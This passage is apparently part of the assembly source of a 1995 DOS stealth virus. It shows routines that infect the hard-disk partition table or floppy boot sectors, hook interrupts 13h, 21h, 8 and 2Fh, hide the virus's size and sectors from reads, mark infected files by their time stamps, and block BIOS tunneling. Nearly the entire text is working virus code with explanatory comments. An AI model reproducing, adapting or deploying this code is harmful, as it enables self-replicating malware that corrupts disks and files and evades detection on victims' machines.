    jmp     close_file                              ;proceed with operation

check_dis:
endif

    cmp     ah,42h                              ;check requested operation
    jnz     read_or_write                           ;branch if not set file pointer
    push    cx                                  ;save high file pointer position on stack
    sub     dx,code_byte_c                          ;hide viral code size from file pointer
    sbb     cx,0                                ;allow for page shift
    call    call_21h                            ;set file pointer into original host file
    pop     cx                                  ;restore high file pointer position from stack
    retf    2                                   ;return from interrupt with flags set

read_or_write:
    pusha                                   ;save all registers on stack
    push    ds                                  ;save segment of buffer on stack
    push    dx                                  ;save offset of buffer on stack
    push    cs                                  ;save code segment on stack
    pop     ds                                  ;restore code segment from stack
    mov     ax,4201h                            ;subfunction to retrieve file pointer
    xor     cx,cx                               ;set high file pointer position to 0
    cwd                                     ;set low file pointer position to 0
    call    call_21h                            ;retrieve current file pointer position
    mov     si,scratch_area                         ;offset of scratch area
    mov     word ptr ds:[si],ax                         ;save low file pointer position
    mov     word ptr ds:[si+2],dx                       ;save high file pointer position
    dec     cx                                  ;set high file pointer position to -1
    mov     dx,not (code_byte_c-1)                      ;set low file pointer position to end of host
    call    set_efp                             ;retrieve original host file size
    mov     word ptr ds:[si+4],ax                       ;save low file pointer position
    mov     word ptr ds:[si+6],dx                       ;save high file pointer position
    mov     bp,sp                               ;point to current top of stack
    cmp     byte ptr ss:[bp+13h],3fh                    ;check requested operation
    jz      read_file                               ;branch if read
    mov     dx,offset exe_buffer-offset code_end                ;point to original header in viral code
    call    set_efp                             ;set file pointer to original host header
    call    read_header                             ;read bytes
    jb      disinf_fp                               ;branch if error (opened for write only)
    push    dx                                  ;save buffer address on stack
    call    set_zfp                             ;set file pointer position to start of file
    pop     dx                                  ;restore buffer address from stack
    call    write_cx                            ;write original header
    mov     cx,word ptr ds:[si+6]                       ;restore high file pointer position
    mov     dx,word ptr ds:[si+4]                       ;restore low file pointer position
    call    set_fp                              ;set file pointer position to original host end
    xor     cx,cx                               ;number of bytes to write
    call    write_file                              ;truncate file (set to original length)
    mov     ax,5700h                            ;subfunction to get file time
    call    call_21h                            ;get file time
    inc     ax                                  ;set subfunction to set file time
    dec     cx                                  ;set 60 seconds
    dec     cx                                  ;set 58 seconds
    call    call_21h                            ;set uninfected file time

disinf_fp:
    mov     cx,word ptr ds:[si+2]                       ;restore high file pointer position
    mov     dx,word ptr ds:[si]                         ;restore low file pointer position
    call    set_fp                              ;set file pointer position to initial position
    pop     ax                                  ;discard 2 bytes from stack
    pop     ds                                  ;restore segment of buffer from stack
    popa                                    ;restore all registers from stack

ife     passive
  ife     anti_rec
    jmp     jfar_1                              ;proceed with write operation
  else
    jmp     jfar_21h_3                              ;proceed with write operation
  endif
else
  ife     anti_rec
    jmp     jfar_21h                            ;proceed with write operation
  else
    jmp     jfar_21h_3                              ;proceed with write operation
  endif
endif

read_file:
    inc     cx                                  ;set CX to 0
    cmp     word ptr ds:[si+2],cx                       ;check high file pointer position
    jnz     not_header                              ;branch if high file pointer position > 64k
    mov     ax,18h                              ;bytes in header
    sub     ax,word ptr ds:[si]                         ;allow for current file pointer position
    ja      save_head                               ;branch if header bytes to be read

not_header:
    xchg    cx,ax                               ;set header byte-count to 0

save_head:
    mov     cx,word ptr ss:[bp+10h]                     ;retrieve requested byte-count
    cmp     cx,ax                               ;compare with maximum header byte-count
    jnb     save_rest                               ;branch if requested count is larger
    mov     ax,cx                               ;set header byte-count to requested byte-count

save_rest:
    sub     cx,ax                               ;calculate requested byte-count without header
    push    cx                                  ;save requested byte-count on stack
    push    ax                                  ;save header byte-count on stack
    mov     cx,0ffffh                               ;set high file pointer position to -1
    mov     dx,offset exe_buffer-offset code_end                ;set low file pointer position to start of original header
    add     dx,word ptr ds:[si]                         ;use current position as index into original header
    call    set_efp                             ;set file pointer position
    lds     dx,dword ptr ss:[bp]                        ;retrieve buffer address
    mov     ah,3fh                              ;subfunction to read file
    pop     cx                                  ;restore header byte-count
    call    call_21h                            ;read bytes
    push    cs                                  ;save code segment on stack
    pop     ds                                  ;restore code segment from stack
    mov     word ptr ds:[si+8],ax                       ;save read byte-count
    add     dx,ax                               ;update buffer offset with read byte-count
    push    dx                                  ;save buffer offset on stack
    add     word ptr ds:[si],ax                         ;retrieve low file pointer position
    mov     dx,word ptr ds:[si]                         ;retrieve low file pointer position
    mov     cx,word ptr ds:[si+2]                       ;retrieve high file pointer position
    call    set_fp                              ;set initial file pointer position
    mov     eax,dword ptr ds:[si]                       ;retrieve file pointer position
    mov     edx,dword ptr ds:[si+4]                     ;retrieve original file size
    cmp     eax,edx                             ;check file pointer position
    jnb     quit_disinf                             ;branch if exceeding original file size
    pop     bp                                  ;restore buffer offset from stack
    xor     ecx,ecx                             ;zero ECX (only require low 16 bits)
    pop     cx                                  ;restore requested byte-count from stack
    add     eax,ecx                             ;update file pointer position
    cmp     eax,edx                             ;check file pointer position
    jbe     read_rest                               ;branch if within original file size
    sub     eax,edx                             ;calculate file overlap
    sub     cx,ax                               ;move read count into CX

read_rest:
    pop     ax                                  ;discard 2 bytes from stack
    pop     ds                                  ;restore buffer segment from stack
    mov     ah,3fh                              ;subfunction to read file
    mov     dx,bp                               ;move buffer offset into DX
    call    call_21h                            ;read file
    add     word ptr cs:[si+8],ax                       ;update read byte-count
    db      0f6h                                ;dummy operation to mask ADD and POP

quit_disinf:
    add     sp,6                                ;discard 6 bytes from stack
    pop     ds                                  ;restore buffer segment from stack

set_count:
    popa                                    ;restore all registers from stack
    mov     ax,word ptr cs:[scratch_area+8]                 ;retrieve total count of bytes read
    jmp     quit_get                            ;return from interrupt with flags set

fix_time:
    push    cx                                  ;save CX on stack
    push    dx                                  ;save DX on stack
    push    ax                                  ;save subfunction on stack
    call    check_seconds                           ;check if file already infected
    pop     ax                                  ;restore subfunction from stack
    jnz     check_time                              ;branch if file is not infected
    cmp     al,1                                ;check requested operation
    jz      check_time                              ;branch if operation is set time
    add     sp,4                                ;discard 4 bytes from stack

quit_get:
    retf    2                                   ;return from interrupt with flags set

check_time:
    pop     dx                                  ;restore DX from stack
    pop     cx                                  ;restore CX from stack
    jnz     set_time                            ;branch if file is not infected
    or      cl,1fh                              ;set all seconds fields

set_time:
ife     passive
    jmp     jfar_1                              ;proceed with time operation
else
    jmp     jfar_21h                            ;proceed with time operation
endif

new_12h:push    ds                                  ;save DS on stack
    push    0                                   ;save 0 on stack
    pop     ds                                  ;set DS to 0
    mov     ax,word ptr ds:[413h]                       ;retrieve current memory size
    pop     ds                                  ;restore DS from stack

;ife     code_kilo_c-2
;        inc     ax
;        inc     ax                                  ;restore top of system memory value
;else
    add     ax,code_kilo_c                          ;restore top of system memory value
;endif

;            the above 'if' statement does not evaluate correctly,
;       because code_kilo_c cannot be calculated until after assembling
;      therefore, the standard code is 1 byte longer than it needs to be

    iret                                    ;return from interrupt
    db      "17/03/95"                              ;welcome to the future of viruses

new_2fh:cmp     ax,1607h                            ;virtual device call out api...
    jnz     jfar_2fh
    cmp     bx,10h                              ;virtual hard disk device...
    jnz     jfar_2fh
    cmp     cx,3                                ;installation check...
    jnz     jfar_2fh
    xor     cx,cx                               ;prevents windows message
                                        ;"cannot load 32-bit disk driver"
    iret                                    ;return from interrupt

jfar_2fh:
    db      0eah                                ;jump xxxx:xxxx
    dd      0                                   ;original interrupt 2fh here

exe_buffer:
if      stub_exe
    db      "MZ"
    dw      (offset begin-offset stub) and 1ffh
    dw      (offset begin-offset stub+1ffh)/200h
    dw      0
    dw      2
    dw      0
    dw      0ffffh
    dw      0fff0h
    dw      0fffeh
    db      "GM"
    dw      100h
    dw      0fff0h
else
  if      stub_sys
    if      inf_sys
    dd      0ffffh
    dw      8000h
    dw      offset strategy-offset stub
    dw      offset interrupt-offset stub
    db      "roygbiv!"
    mov     word ptr cs:[offset old_bx-offset stub],bx
    db      2eh
    else
    int     20h
    db      0
    db      15h dup (0)
    endif
  else
    int     20h
    db      0
    db      15h dup (0)
  endif
endif

newp_loader:

ife     tiny_load
    xor     bx,bx                               ;zero BX
    mov     ss,bx                               ;set stack segment
    mov     sp,7c00h                            ;set stack pointer

; ife     inf_boot
;   ife     code_kilo_c-2
;       mov     cx,2                                ;cylinder 0, sector 2
;       sub     byte ptr cs:[413h],cl                       ;reduce size of total system memory
;   else
;       sub     word ptr cs:[413h],code_kilo_c                  ;reduce size of total system memory
;   endif
; else
    sub     word ptr cs:[413h],code_kilo_c                  ;reduce size of total system memory
; endif

;            the above 'if' statement does not evaluate correctly,
;       because code_kilo_c cannot be calculated until after assembling
;      therefore, the standard code is 1 byte longer than it needs to be

    int     12h                                 ;allocate memory at top of system memory
    shl     ax,6                                ;convert kilobyte count to memory segment
    mov     es,ax                               ;retrieve segment of new top of system memory
else
    mov     bx,7c00h                            ;segment of transient portion
    mov     ss,bx                               ;set stack segment
    mov     sp,bx                               ;set stack pointer
    mov     es,bx                               ;save destination segment

load_code:
endif

    mov     ax,code_sect_c+200h                         ;number of sectors in code

;if      inf_boot
;track:  mov     cx,2                                ;cylinder 0, sector 2
;else
;  if      code_kilo_c-2
track:  mov     cx,2                                ;cylinder 0, sector 2
;  endif
;endif

;            the above 'if' statement does not evaluate correctly,
;       because code_kilo_c cannot be calculated until after assembling
;      therefore, the standard code is 1 byte longer than it needs to be

side:   mov     dx,80h                              ;of hard disk
    int     13h                                 ;read viral code sectors to top of system memory

ife     tiny_load
    push    es                                  ;save top of system memory code segment on stack
    push    offset phook_interrupts-offset begin                ;save top of system memory offset on stack
                                        ;(simulate far call)
    retf                                    ;return from far call
                                        ;(continue execution at top of system memory)
else
    db      9ah                                 ;call xxxx
    dw      offset alloc_mem-offset begin+7c00h
    dw      7c00h                               ;branch to viral code
endif

new_part:
    db      0,0,1,0,5,0,0b8h,0bh,1,0,0,0,0bch,1,0,0             ;new active partition

if      tiny_load
alloc_mem:
    pop     di                                  ;restore DI from stack
    pop     es                                  ;restore ES from stack
    
; ife     inf_boot
;   ife     code_kilo_c-2
;       sub     word ptr es:[413h],cl                       ;reduce size of total system memory
;   else
;       sub     word ptr es:[413h],code_kilo_c                  ;reduce size of total system memory
;   endif
; else
    sub     word ptr es:[413h],code_kilo_c                  ;reduce size of total system memory
; endif

;            the above 'if' statement does not evaluate correctly,
;       because code_kilo_c cannot be calculated until after assembling
;      therefore, the standard code is 1 byte longer than it needs to be

    int     12h                                 ;allocate memory at top of system memory
    shl     ax,6                                ;convert kilobyte count to memory segment
    std                                     ;set index direction to backwards
    scasw                                   ;skip 2 bytes in destination
    stosw                                   ;store new top of memory segment
    push    ax                                  ;save top of memory segment on stack
    mov     ax,offset phook_interrupts-offset begin             ;offset of destination for jump
    stosw                                   ;store offset
    pop     es                                  ;restore top of memory segment from stack
    xor     bx,bx                               ;set offset to 0
    sub     di,offset new_part-offset load_code-6               ;allow for offset in code
    push    bx                                  ;save BX on stack
    push    di                                  ;save DI on stack
                                        ;(simulate far call)
    retf                                    ;branch to hook interrupts
endif

phook_interrupts:
    xchg    bx,ax                               ;zero AX

ife     passive
    mov     byte ptr cs:[offset cmp_subfn-offset begin+2],al        ;zero subfunction number
endif

    mov     ds,ax                               ;set DS to 0

ife     inf_sys
  if      res_umb
    ife     useumb_flag-1
    inc     ax                                  ;specify code not loaded high
    else
    mov al,useumb_flag                          ;specify code not loaded high
    endif
  endif
else
  ife     device_flag-1
    inc     ax                                  ;specify code not loaded high
  else
    mov al,device_flag                          ;specify code not loaded high
  endif
endif

if      tiny_load
    cld                                     ;set index direction to forward
endif

    mov     di,toggle_byte                          ;area to clear
    stosb                                   ;interrupt 12h not yet hooked,
                                        ;interrupt 21h not executing
    stosw                                   ;specify no programs currently executing

ife     passive
    mov     si,4ch                              ;offset of interrupt 13h in interrupt table
    mov     di,offset jfar_13h-offset begin+1                   ;area to store original interrupt 13h address
    movsd                                   ;save original address
    cli                                     ;disable interrupts
    mov     word ptr ds:[si-4],offset new_13h-offset begin          ;store new offset
    mov     word ptr ds:[si-2],cs                       ;store new code segment
    sti                                     ;enable interrupts
    mov     word ptr ds:[si+42h],cs                     ;destroy interrupt 24h segment
                                        ;(when COMSPEC file loads, the value here will be set)
else
    mov     ax,offset new_8-offset begin                    ;offset of new interrupt 8 handler

  if      inf_boot
    mov     cx,2                                ;set loop count to 2
  endif

    mov     si,20h                              ;offset of interrupt 8 in interrupt table
    mov     di,offset jfar_21h-offset begin+1                   ;area to store original interrupt 8 address
    cli                                     ;disable interrupts

hook_part:
    movsd                                   ;save original address
    mov     word ptr ds:[si-4],ax                       ;store new offset
    mov     word ptr ds:[si-2],cs                       ;store new segment
    mov     ax,offset new_13h-offset begin                  ;offset of new interrupt 13h handler
    mov     si,4ch                              ;offset of interrupt 13h in interrupt table
    mov     di,offset jfar_13h-offset begin+1                   ;area to store original interrupt 13h address
    loop    hook_part
    sti                                     ;enable interrupts
    mov     word ptr ds:[si+36h],cs                     ;destroy interrupt 21h segment
                                        ;(when system file loads, the value here will be set)
endif

    push    ds                                  ;save 0 on stack
    pop     es                                  ;set ES to 0
    mov     ax,201h                             ;read 1 sector

ife     tiny_load
    mov     bx,sp                               ;to offset 7c00h
else
    mov     bx,7c00h                            ;to offset 7c00h
endif

ife     passive
  ife     inf_boot
    dec     cx                                  ;cylinder 0, sector 1
  else
    mov     cx,1                                ;cylinder 0, sector 1
  endif
else
    inc     cx                                  ;cylinder 0, sector 1
endif

if      inf_boot
    xor     dh,dh                               ;side 0
endif

    pushf                                   ;save flags on stack
    push    es                                  ;save code segment on stack
    push    bx                                  ;save offset of boot sector on stack
                                        ;(simulate far call)
ife     passive

;      aggressive tracing cannot be executed from within a timer routine,
;   because if HIMEM.SYS loads, the interrupt 21h segment could be relocated
;                    after I've hooked it.

new_timer:
    mov     word ptr cs:[offset new_13h-offset begin],531eh         ;restore original operation
    push    ds                                  ;save DS on stack
    push    0                                   ;save 0 on stack
    pop     ds                                  ;set DS to 0
    cmp     word ptr ds:[92h],1000h                     ;check segment of interrupt 24h
    jb      timer_hook                              ;branch if COMSPEC file loaded
    pushf                                   ;save flags on stack
    push    cs                                  ;save CS on stack
    call    new_13h                             ;save offset on stack
                                        ;(simulate interrupt call)
    mov     word ptr cs:[offset new_13h-offset begin],(not (offset new_13h-offset new_timer+1))*100h+0ebh
                                        ;store new operation
    pop     ds                                  ;restore DS from stack
    retf    2                                   ;return from interrupt with flags set

timer_hook:
    push    es                                  ;save ES on stack
    pusha                                   ;save all registers on stack
    call    hook_int                            ;hook interrupt 21h
    popa                                    ;restore all registers from stack
    pop     es                                  ;restore ES from stack
    pop     ds                                  ;restore DS from stack
endif

new_13h:push    ds                                  ;save DS on stack
    push    bx                                  ;save BX on stack
    xor     bx,bx                               ;zero BX
    mov     ds,bx                               ;set DS to 0
    lds     bx,dword ptr ds:[bx+4]                      ;retrieve offset of interrupt 1 handler
    push    word ptr ds:[bx]                        ;save video segment:interrupt 1 handler offset
    mov     byte ptr ds:[bx],0cfh                       ;save IRET in video segment:interrupt 1 handler offset
    push    0                                   ;save 0 on stack
    popf                                    ;disable interrupt 1
    pop     word ptr ds:[bx]                        ;restore video segment:interrupt 1 handler offset
    pop     bx                                  ;restore BX from stack
    pop     ds                                  ;restore DS from stack

;                all attempts at a tunneling technique
;                  to locate the address of the BIOS
;               will be terminated by this code

    cmp     ax,1badh                            ;check requested operation
    jnz     jfar_13h                            ;branch if not call sign

int13h_branch:
    mov     ax,0deedh                               ;return sign
    iret                                    ;return from interrupt

ife     inf_boot
    cmp     dx,80h                              ;check which disk is being accessed
else
    test    dh,dh                               ;check side number
endif

    jnz     jfar_13h                            ;branch if not hard disk
    cmp     cx,code_sect_c+1                        ;check which sectors are being accessed
    ja      jfar_13h                            ;branch if not viral code sectors or partition table

ife     inf_boot
    cmp     ah,3                                ;check requested operation
    jz      skip_op                             ;branch if write
    cmp     ah,2                                ;check requested operation
    jnz     jfar_13h                            ;branch if not read
else
    cmp     dl,80h                              ;check which disk is being accessed
    ja      jfar_13h                            ;branch if hard disk other than C:
    jb      floppy_disk                             ;branch if not hard disk
    cmp     ah,3                                ;check requested operation
    jz      skip_op                             ;branch if write

floppy_disk:
    cmp     ah,2                                ;check requested operation
    jz      okay_op                             ;branch if write
    cmp     ah,3                                ;check requested operation
    jnz     jfar_13h                            ;branch if not read

okay_op:push    ds                                  ;save DS on stack
endif

    pusha                                   ;save all registers on stack
    push    ax                                  ;save AX on stack

if      passive
  ife     inf_boot
    pushf                                   ;save flags on stack
    push    cs                                  ;save code segment on stack
  endif
endif

if      inf_boot
    push    es                                  ;save segment of buffer on stack
    pop     ds                                  ;restore segment of buffer from stack
endif

    push    offset cont_13h-offset begin                    ;save offset on stack
                                        ;(simulate interrupt call)
ife     passive
call_13h:
    pushf                                   ;save flags on stack
    push    cs                                  ;save code segment on stack
    push    offset known_ret-offset begin                   ;save offset on stack
                                        ;(simulate interrupt call)
else
  if      inf_boot
call_13h:
    pushf                                   ;save flags on stack
    push    cs                                  ;save code segment on stack
    push    offset known_ret-offset begin                   ;save offset on stack
                                        ;(simulate interrupt call)
  endif
endif

jfar_13h:
    db      0eah                                ;jump xxxx:xxxx
    dd      0                                   ;original interrupt 13h here

cont_13h:
    mov     bp,sp                               ;point to current top of stack
    mov     word ptr ss:[bp+10h],ax                     ;save return code on stack
    pop     ax                                  ;restore AX from stack

ife     inf_boot
    jb      quit_part                               ;branch if error occurred
else
    jb      jmp_quit                            ;branch if error occurred
endif

    dec     cx                                  ;check which sectors are being accessed
    jnz     vir_sectors                             ;branch if not accessing partition table

ife     inf_boot
  ife     tiny_load
    cmp     word ptr es:[bx+offset new_part-offset newp_loader-3],offset phook_interrupts-offset begin
                                        ;check partition table
  else
    cmp     word ptr es:[bx+offset new_part-offset newp_loader-4],offset alloc_mem-offset begin+7c00h
                                        ;check partition table
  endif
    jnz     quit_part                               ;branch if not infected
else
    test    dl,dl                               ;check which disk is being accessed
    jns     boot_area                               ;branch if not hard disk

  ife     tiny_load
    cmp     word ptr ds:[bx+offset new_part-offset newp_loader-3],offset phook_interrupts-offset begin
                                        ;check partition table
  else
    cmp     word ptr ds:[bx+offset new_part-offset newp_loader-4],offset alloc_mem-offset begin+7c00h
                                        ;check partition table
  endif
    jnz     jmp_quit                            ;branch if not infected
endif

    mov     cl,move_isize   ;directive at end of code to calculate this     ;active partition byte-count
    mov     si,old_part                             ;offset of area containing original partition table

p_offset:
    lea     di,word ptr [bx+"MG"]                       ;retrieve offset of partition information
    db      2eh                                 ;CS:
                                        ;(to avoid having to save and set DS)
    repz                                    ;repeat until CX = 0...
    db      move_ptype      ;directive at end of code to calculate this     ;restore original partition information
    mov     cl,move_psize   ;directive at end of code to calculate this     ;new partition table loader byte-count
    mov     di,bx                               ;move offset of partition table into DI
    db      2eh                                 ;CS:
                                        ;(to avoid having to save and set DS)
    repz                                    ;repeat until CX = 0...
    db      move_ptype      ;directive at end of code to calculate this     ;restore original partition table code
    dec     al                                  ;reduce number of sectors by 1
    jz      quit_part                               ;branch if only 1 sector requested
    add     bh,2                                ;skip partition table

vir_sectors:

if      inf_boot
    test    dl,dl                               ;check which disk is being accessed
    jns     quit_part                               ;branch if not hard disk
endif

    cmp     al,code_sect_c                          ;check number of sectors being accessed
    jb      set_loop                            ;branch if fewer than viral sectors
    mov     al,code_sect_c                          ;set sectors read to number of viral sectors

set_loop:
    cbw                                     ;only want the sector count
    cwd                                     ;zero DX
    xchg    ah,al                               ;calculate number of bytes to clear
    xchg    cx,ax                               ;move loop count into CX
    xchg    dx,ax                               ;set store word to 0
    mov     di,bx                               ;move offset of sectors to blank into DI
    repz    stosw                               ;clear viral code sectors in memory
                                        ;(pretend sectors are blank)
if      inf_boot
jmp_quit:
    jmp     quit_part                               ;branch to quit handler

boot_area:

  ife     tiny_load
    cmp     word ptr ds:[bx+offset new_part-offset newp_loader+3bh],offset phook_interrupts-offset begin
                                        ;check boot sector
  else
    cmp     word ptr ds:[bx+offset new_part-offset newp_loader+3ah],offset alloc_mem-offset begin+7c00h
                                        ;check boot sector
  endif

    jz      disinf                              ;branch if infected
    call    calc_sect                               ;calculate last available sectors

save_track:
    push    es                                  ;save segment of buffer on stack
    push    bx                                  ;save offset of buffer on stack
    push    cx                                  ;save track number on stack
    push    cs                                  ;save CS on stack
    pop     es                                  ;restore CS from stack
    xor     bx,bx                               ;set write offset to 0
    sub     cx,code_sect_c                          ;calculate first sector to write
    mov     ax,cx
    mov     di,offset track-offset begin+1
    stosw                                   ;save track of available sectors
    mov     ah,dh
    xor     al,al                               ;set drive to A:
    inc     di
    stosw                                   ;save side of available sectors
    mov     ax,300h+code_sect_c                         ;number of sectors to write
    call    call_13h                            ;write sectors
    pop     cx                                  ;restore track number from stack
    pop     bx                                  ;restore offset of buffer from stack
    pop     es                                  ;restore segment of buffer from stack
    cmc                                     ;clear carry if error occurred
    jnb     quit_part                               ;branch if error occurred
    mov     ax,301h                             ;write 1 sector
    push    ax                                  ;save AX on stack
    call    call_13h                            ;save original boot sector
    mov     word ptr ds:[bx],3cebh                      ;store initial jump to new boot code
    mov     cx,move_psize                           ;number of bytes in new boot code
    mov     si,offset newp_loader-offset begin                  ;offset of new boot code
    lea     di,word ptr [bx+3eh]                        ;offset of area to store new boot code
    db      2eh                                 ;CS:
                                        ;(to avoid having to save and set DS)
    repz                                    ;repeat until CX = 0...
    db      move_ptype                              ;store new boot code
    pop     ax                                  ;restore AX from stack
    inc     cx                                  ;to cylinder 0, sector 1
    xor     dh,dh                               ;side 0
    call    call_13h                            ;write new boot sector

disinf: call    calc_sect                               ;calculate last available sectors
    mov     ax,201h                             ;read 1 sector
    call    call_13h                            ;read boot sector
endif

quit_part:
    popa                                    ;restore all registers from stack

if      inf_boot
    pop     ds                                  ;restore DS from stack
endif

skip_op:retf    2                                   ;return from interrupt with flags set

if      inf_boot
calc_sect:
    mov     ax,word ptr ds:[bx+13h]                     ;retrieve total sector count
    mov     cx,word ptr ds:[bx+18h]                     ;retrieve sectors per track count
    push    dx                                  ;save DX on stack
    cwd                                     ;zero DX
    div     word ptr ds:[bx+1ah]                        ;divide total sector count by head count
    div     cx                                  ;divide remainder by sectors per track count
    dec     ax                                  ;subtract 1 track
    mov     ch,al                               ;store track number in CH
    pop     dx                                  ;restore DX from stack
    mov     dh,byte ptr ds:[bx+1ah]                     ;retrieve head count
    dec     dh                                  ;subtract 1 head
    ret                                     ;return from subroutine
endif

if      passive
new_8:  call    call_21h                            ;simulate interrupt call
    cli                                     ;disable interrupts
    push    ds                                  ;save DS on stack
    pusha                                   ;save all registers on stack
    push    0                                   ;save 0 on stack
    pop     ds                                  ;set DS to 0
    mov     di,20h                              ;offset of interrupt 8 in interrupt table
    cmp     word ptr ds:[di+66h],1000h                      ;check owner of interrupt 21h
    jnb     exit_8                              ;branch if system file has not loaded yet
    push    es                                  ;save ES on stack
    push    ds                                  ;save 0 on stack
    pop     es                                  ;set ES to 0
    mov     si,offset jfar_21h-offset begin+1                   ;offset of original interrupt 8 address
    db      2eh                                 ;CS:
                                        ;(to avoid having to set DS)
    movsd                                   ;restore original address
    mov     si,84h                              ;code segment pointer to MSDOS.SYS (or equivalent)
    call    hook_int                            ;hook interrupt 21h
    pop     es                                  ;restore ES from stack

exit_8: popa                                    ;restore all registers from stack
    pop     ds                                  ;restore DS from stack
    iret                                    ;return from interrupt
endif

code_end:


;                         DATA
;          used by partition infection, not present in infected files
;                      size = 52/53 bytes
;                   (41/42 for tiny)

old_part    equ     (offset $-offset begin+1) and 0fffeh            ;word-align data area if odd
           ;db      10h dup (0)                         ;area to contain old active partition
           ;db      offset new_part-offset newp_loader dup (0)          ;area to contain old partition table loader

;                         DATA
;              used while resident, not present in infected files
;                   size = 35 bytes
;                    (45 for .SYS)
;                   +5 for passive tracing

ife     inf_sys
temp1       equ     old_part+offset new_part-offset newp_loader+10h
else
new_strategy    equ     old_part+offset new_part-offset newp_loader+10h
           ;db      5 dup (0)                           ;area to contain far jump to host strategy handler

new_handler     equ     new_strategy+5
           ;db      5 dup (0)                           ;area to contain far jump to host interrupt handler
temp1       equ     new_handler+5
endif

header_buffer   equ     temp1
           ;db      18h dup (0)                         ;area to contain original file header during infection

scratch_area    equ     header_buffer+18h
           ;db      0ah dup (0)                         ;scratch area for infection and disinfection

ife     passive
temp2       equ     scratch_area+0ah
else
old21h_code     equ     scratch_area+0ah
           ;db      5 dup (0)                           ;area to contain original 5 bytes of interrupt handler
temp2       equ     old21h_code+5
endif

toggle_byte     equ     temp2
           ;db      0                               ;toggle switch

total_end       equ     toggle_byte+1

;quick calculations below:
init_part       equ     offset new_part-offset newp_loader              ;code-length
init_bin    equ     init_part and 1                     ;odd-even test
init_rem    equ     (init_bin xor 1)+1                      ;odd-even divisor
move_isize      equ     10h/init_rem                        ;unchanged if odd, halved if even
move_psize      equ     init_part/init_rem                      ;unchanged if odd, halved if even
move_ptype      equ     0a5h-init_bin                       ;MOVSB if odd, MOVSW if even

end     stub
